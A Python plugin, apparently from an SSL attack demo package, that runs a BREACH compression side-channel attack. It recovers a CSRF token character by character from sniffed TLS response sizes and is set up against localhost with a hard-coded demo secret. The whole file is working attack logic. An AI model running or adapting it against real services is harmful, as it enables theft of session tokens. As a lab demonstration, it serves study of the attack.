import threading
from operator import or_
from functools import reduce
import struct
import time
import logging
import sys
from ssl_demos.common import get_terminal_size

SECRET = '0372e249-7932-41ba-8dbb-6e79e991c8e7'
TOKEN = '7b38918f6fcd5b2f1245fece252034b1d61bbf67452952dd47c8ac296a3c1b72'
PREFIX = 'input type="hidden" name="csrftoken" value="'#[-15:]
# PORT = 8443
PORT = 2000
INTERFACE = 'lo'

log = logging.getLogger(__name__)

class BreachPlugin:
    use_sniffer = True

    def __init__(self, core, sniffer):
        self.core = core
        self.sniffer = sniffer

    def start(self):
        self.test()

    def test_char(self, c, base, minsize):
        log.debug('Testing %s', c)
        # self.total = 0
        # resp = requests.get('https://127.0.0.1:8443', params={
        #     'test': base + c
        #     }, cookies={
        #         'sessionid': SECRET
        #     }, verify=False)
        # resp = requests.get('https://127.0.0.1:2000', params={
        #     'affiliate': 
        #     }, cookies={
        #         'SESSION': SECRET
        #     }, verify=False)
        
        if not self.sniffer.closed_connections.empty():
            log.error('Closed connections not empty: %r', self.sniffer.closed_connections.get())
        value = self.core.prefix + base + c
        if len(value) > 64:
            value = value[-64:]
        self.core.send(placeholders={
            'DATA': value
        })

        conn = self.sniffer.closed_connections.get()
        log.debug('Got connection %r', conn)
        self.print_char(c, conn.tls_recvd, minsize)
        self.print_state(base, c)
        return conn.tls_recvd

    def test(self):
        charset = self.core.charset

        # do test request
        # self.core.send(placeholders={
        #     'DATA': self.core.prefix
        # })

        base = self.core.start
        while len(base) < len(self.core.target):
            best = (9999, None)
            all_results = { c: 99999 for c in charset }
            back = [('', 9999)]
            while len(back) > 0:
                b, refsize = back.pop(0)
                results = { c: 99999 for c in charset }
                for c in charset:
                    size = self.test_char(b + c, base, best[0])
                    if size:
                        results[c] = size
                        all_results[b+c] = size
                        if best[0] > size or best[0] == size and len(best[1]) < len(b+c):
                            best = size, b+c
                resminsize = min(results.values())
                if refsize < resminsize and len(back) > 0 and min(map(lambda x: x[1], back)) >= resminsize:
                    log.warning('Previous size of %s is lower than current size and no other available: %d < %d. Accept and restart', b, refsize, resminsize)
                    break
                else:
                    minsize = min(best[0], resminsize)
                    best_results = []
                    for c, val in results.items():
                        if val == minsize:
                            best_results.append((b+c, minsize))
                if len(best_results) == 1 and len(back) == 0:
                    break
                else:
                    back += best_results
                    back.sort(key=lambda x: (len(x[0]), x[1]))
                    self.print_backlog(minsize, back, base)
                    self.print_state(base, best_results[0][0] if best_results else '')
            while True:
                best_results = []
                for c, val in all_results.items():
                    if val == best[0] and len(c) == len(best[1]):
                        best_results.append(c)
                self.print_current_results(best_results)
                if len(best_results) <= 1:
                    break
                log.warning('To many results. Retry with 2nd best')
                prev = best[0]
                best = (9999, None)
                for c, val in all_results.items():
                    if val > prev and (val < best[0] or val == best[0] and len(best[1]) < len(c)):
                        best = val, c

            base += best[1]
            self.print_state(base, '')

    def print_current_results(self, results):
        self._update_line('Results: {}'.format(results))

    def print_backlog(self, minsize, back, base):
        back = ', '.join(
            "('{}{}\033[0m', {})".format(
                '\033[96m' if self.core.target.startswith(base + val) else '\033[91m',
                val,
                score)
            for val, score in back
        )
        self._update_line('Retesting with \033[94m{}\033[0m: [{}]'.format(minsize, back))

    def print_state(self, base, guess):
        correct = ''
        for char, ref in zip(base, self.core.target):
            if char == ref:
                correct += char
            else:
                break
        sys.stdout.write("\nCurrent: \033[92m{}\033[91m{}\033[95m{}\033[0m Target: \033[93m{}\033[0m".format(correct, base[len(correct):], guess, self.core.target))

    def print_char(self, c, size, minsize):
        if size > minsize:
            color = 91
        elif size < minsize:
            color = 92
        else:
            color = 93
        text = "Bytes for {}: \033[{}m{}\033[0m".format(c, color, size)
        self._update_line(text)

    def _update_line(self, text):
        align = ("\r{: <" + str(get_terminal_size()[0]) + "}").format
        sys.stdout.write(align(text))
